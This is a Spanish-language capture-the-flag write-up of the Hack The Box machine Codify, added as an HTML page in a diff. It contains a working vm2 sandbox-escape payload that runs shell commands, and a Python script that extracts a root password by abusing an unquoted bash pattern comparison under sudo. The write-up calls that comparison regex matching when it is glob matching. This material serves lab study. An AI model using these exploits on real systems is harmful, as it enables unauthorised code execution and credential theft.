@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <title>
+Writeup Máquina Codify HTB | passpow
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="generator" content="Hugo 0.80.0" />
+
+
+<link rel="canonical" href="/posts/m%C3%A1quina-codify-htb/" >
+<link href="/sass/main.min.7c57d7795628d7c025cc5db105e8a8d02017cfd7b77929b93c867586a4b49d65.css" rel="stylesheet">
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a href="">
+                <span class="terminal">passpow@passpow.github.io ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="/about" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Writeup Máquina Codify HTB</h1>
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/hacking/">#Hacking</a><span></span>
+    <a href="/tags/nodejs/">#nodejs</a><span></span>
+    <a href="/tags/vm-sandbox-scape/">#vm sandbox scape</a><span></span>
+    <a href="/tags/python/">#python</a><span></span>
+    <a href="/tags/bash/">#bash</a><span></span>
+    <a href="/tags/crypto/">#crypto</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2023-12-24">24 Dec 2023</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>2 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <p>Resolución de la máquina Codify</p>
+<p><img src="/posts/images/codify/htb.png" alt="htb"></p>
+<hr>
+<p>Al ingresar al sitio web proporcionado, observamos que es una plataforma para ejecutar Node.js en línea. Intenté ejecutar comandos con <code>child_process</code> y leer archivos con <code>fs</code>, pero ambos estaban restringidos.</p>
+<p><img src="/posts/images/codify/pg1.png" alt="page"></p>
+<p>Después de varios intentos, noté que la página mencionaba el uso de la sandbox <code>vm2</code>.</p>
+<p><img src="/posts/images/codify/vm2.png" alt="vm2"></p>
+<p>Al investigar un poco más, descubrí una vulnerabilidad reciente que permite escapar de la sandbox.</p>
+<p>Referencias:</p>
+<ul>
+<li><a href="https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9">Gist 1</a></li>
+<li><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Gist 2</a></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">
+
+<span style="color:#66d9ef">const</span> {<span style="color:#a6e22e">VM</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;vm2&#34;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">vm</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">VM</span>();
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
+</span><span style="color:#e6db74">err = {};
+</span><span style="color:#e6db74">const handler = {
+</span><span style="color:#e6db74">    getPrototypeOf(target) {
+</span><span style="color:#e6db74">        (function stack() {
+</span><span style="color:#e6db74">            new Error().stack;
+</span><span style="color:#e6db74">            stack();
+</span><span style="color:#e6db74">        })();
+</span><span style="color:#e6db74">    }
+</span><span style="color:#e6db74">};
+</span><span style="color:#e6db74">  
+</span><span style="color:#e6db74">const proxiedErr = new Proxy(err, handler);
+</span><span style="color:#e6db74">try {
+</span><span style="color:#e6db74">    throw proxiedErr;
+</span><span style="color:#e6db74">} catch ({constructor: c}) {
+</span><span style="color:#e6db74">    c.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;touch pwned&#39;);
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">`</span>
+
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">code</span>));
+</code></pre></div><p><img src="/posts/images/codify/vm2-exploit.png" alt="vm2-exploit"></p>
+<p>Gracias a esto consigo una shell.</p>
+<p><img src="/posts/images/codify/nc.png" alt="nc"></p>
+<p>Buscando por los archivos de la máquina encuentro una base de datos.</p>
+<p><img src="/posts/images/codify/db.png" alt="db"></p>
+<p>En la que se encuentra la contraseña del usuario joshua.</p>
+<p><img src="/posts/images/codify/joshua.png" alt="joshua"></p>
+<p><img src="/posts/images/codify/crackshash.png" alt="crackshash"></p>
+<p>Rompo el hash con jhon y puedo acceder vía ssh.</p>
+<p><img src="/posts/images/codify/sudo.png" alt="sudo"></p>
+<p>A la hora de escalar privilegios me encuentro que puedo ejecutar un script llamado <strong>mysql-backup</strong> como root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>DB_USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;root&#34;</span>
+DB_PASS<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/cat /root/.creds<span style="color:#66d9ef">)</span>
+BACKUP_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/backups/mysql&#34;</span>
+
+read -s -p <span style="color:#e6db74">&#34;Enter MySQL password for </span>$DB_USER<span style="color:#e6db74">: &#34;</span> USER_PASS
+/usr/bin/echo
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $DB_PASS <span style="color:#f92672">==</span> $USER_PASS <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+        /usr/bin/echo <span style="color:#e6db74">&#34;Password confirmed!&#34;</span>
+<span style="color:#66d9ef">else</span>
+        /usr/bin/echo <span style="color:#e6db74">&#34;Password confirmation failed!&#34;</span>
+        exit <span style="color:#ae81ff">1</span>
+<span style="color:#66d9ef">fi</span>
+
+/usr/bin/mkdir -p <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
+
+databases<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/mysql -u <span style="color:#e6db74">&#34;</span>$DB_USER<span style="color:#e6db74">&#34;</span> -h 0.0.0.0 -P <span style="color:#ae81ff">3306</span> -p<span style="color:#e6db74">&#34;</span>$DB_PASS<span style="color:#e6db74">&#34;</span> -e <span style="color:#e6db74">&#34;SHOW DATABASES;&#34;</span> | /usr/bin/grep -Ev <span style="color:#e6db74">&#34;(Database|information_schema|performance_schema)&#34;</span><span style="color:#66d9ef">)</span>
+
+<span style="color:#66d9ef">for</span> db in $databases; <span style="color:#66d9ef">do</span>
+    /usr/bin/echo <span style="color:#e6db74">&#34;Backing up database: </span>$db<span style="color:#e6db74">&#34;</span>
+    /usr/bin/mysqldump --force -u <span style="color:#e6db74">&#34;</span>$DB_USER<span style="color:#e6db74">&#34;</span> -h 0.0.0.0 -P <span style="color:#ae81ff">3306</span> -p<span style="color:#e6db74">&#34;</span>$DB_PASS<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$db<span style="color:#e6db74">&#34;</span> | /usr/bin/gzip &gt; <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">/</span>$db<span style="color:#e6db74">.sql.gz&#34;</span>
+<span style="color:#66d9ef">done</span>
+
+/usr/bin/echo <span style="color:#e6db74">&#34;All databases backed up successfully!&#34;</span>
+/usr/bin/echo <span style="color:#e6db74">&#34;Changing the permissions&#34;</span>
+/usr/bin/chown root:sys-adm <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
+/usr/bin/chmod <span style="color:#ae81ff">774</span> -R <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
+/usr/bin/echo <span style="color:#e6db74">&#39;Done!&#39;</span>
+</code></pre></div><p>Revisando el código de este script encontramos la comparación de igualdad <strong>[[ $DB_PASS == $USER_PASS ]]</strong> el problema está en que
+esta comparación es insegura ya que en bash esta comparación interpreta expresiones regulares, para que esto no fuese así la
+comparación debería ser <strong>[ $DB_PASS = $USER_PASS ]</strong></p>
+<p><img src="/posts/images/codify/expresion-regular.png" alt="regular expresion"></p>
+<p>En este caso si la contraseña empieza por a y introducimos a* el condicional se cumpliría, tenteniendo esto en cuenta podemos hacer una especie de bruteforce con el script.</p>
+<pre><code>#passpow.github.io
+
+import string
+import os
+import sys
+passwd=&quot;&quot;
+before=[]
+def check_passwd(letter):
+	global passwd
+	if &quot;Password confirmation failed!&quot; in os.popen('echo &quot;{}*&quot; | sudo /opt/scripts/mysql-backup.sh'.format(passwd+letter)).read():
+		return 1
+	else:
+		passwd+=letter
+		print(passwd)
+
+
+
+def check_passwd2(letter): #lol
+	global passwd
+
+	if &quot;Password confirmation failed!&quot; in os.popen('echo &quot;{}&quot; | sudo /opt/scripts/mysql-backup.sh'.format(passwd+letter)).read():
+		return 1
+	else:
+		passwd+=letter
+		print(passwd)
+
+
+
+while True:
+	for i in string.ascii_letters+string.digits:
+		check_passwd(i)
+		if passwd==&quot;kljh12k3jhaskjh12kjh&quot;: 
+
+			for i in string.ascii_letters+string.digits:
+				check_passwd2(i)
+				
+</code></pre><p><img src="/posts/images/codify/exploit.png" alt="exploit"></p>
+<p><img src="/posts/images/codify/root.png" alt="root"></p>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>passpow</span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
